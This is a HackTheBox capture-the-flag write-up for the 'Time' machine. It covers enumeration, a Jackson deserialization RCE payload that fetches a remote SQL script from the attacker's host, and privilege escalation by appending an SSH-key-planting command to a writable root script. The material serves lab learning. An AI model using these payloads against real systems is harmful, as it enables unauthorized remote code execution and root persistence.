<script src="https://www.hackthebox.eu/badge/36120"></script>

<h2>Time - HackTheBox - WriteUp</h2>


<h1>Steps</h1>

<hr>1° step: Nmap scan
<hr>2° step: Dirsearch (nothing interesting found)
<hr>3° step: Enumeration
<hr>3° step: Test a vector in the web application
<hr>4° step: Getting a shell
<hr>5° step: Privilege escalation


<h1>Nmap</h1>
![image](https://i.imgur.com/nNgEXkK.png "Nmap Scan")<br>
We found two ports: 22 and 80.


While I was enumerating the webserver, I left running dirsearch.
![image](https://imgur.com/iFMN0Fv.png "Dirsearch")<br>
Nothing interesting found.


In the webserver, there's a "JSON Beautifier and Validator"<br>
Testing "Beautify" option, nothing curious was found.
![image](https://imgur.com/oXxi1e0.png "Webserver")<br>

But, if we change to "Validate(Beta!)" option, we see something interesting.
![image](https://imgur.com/Ya1EBHq.png "Validate vector")<br>
An error, that's awesome! Beta features are always interesting, let's take a look for it.

That's the complete error:
![image](https://imgur.com/nGsqPqX.png "Complete error")<br>
I marked an interesting factor, let's research it.


After some research, I found and read some articles talking about "Jackson Deserialization" and a "RCE" in this library.<br>
I tried to send '{"FDivision"}' and the error changed:
![image](https://imgur.com/TMCdfOe.png "New error")<br>

Searching on google and reading a little, I checked a solution for this error.<br>
We need to use "[]" instead of "{}"<br>
Following this thought, I got this response:<br>
![image](https://imgur.com/yJ0VYq1.png "Could not resolve type id 'FDivision', no class found")<br>

Searching for it, I found an exploit. [Github exploit](https://github.com/jas502n/CVE-2019-12384)<br>

<h1>Let's start exploiting.</h1><br>

First, we need to create a "inject.sql", as was said [here](https://github.com/jas502n/CVE-2019-12384)<br>

Then, start your listeners.<br>
![image](https://imgur.com/sPCiXxN.png "NC listener")<br>
![image](https://imgur.com/amInJkc.png "Python listener")<br>

Now we can send the payload:
<p>"["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.197/inject.sql'"}]"</p><br>

And we got the user!
![image](https://imgur.com/sramzmY.png "user flag")<br>

<h1>Privilege Escalation</h1><br>

If we run any enumeration script, You'll see a script called "timer_backup.sh"<br>
I won't print the exit of this tools, because it's too big.<br>

Here we can see the permissions of this script.<br>
![image](https://imgur.com/5TO81Ht.png "Script perms")<br>
We can write into the file!<br>
Lets try to put our ssh key.<br>

' echo "echo KEY >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh '<br>
(You need to change "KEY" to your ssh public key)<br>
![image](https://imgur.com/YIhS0bZ.png "command")<br>

Then we can login as root in SSH:<br>
![image](https://imgur.com/X0x4wke.png "rooted")<br>

<h1>Just to curious: It has a second way to root.</h1>

![image](https://imgur.com/SVYgD87.png "Second way to root")
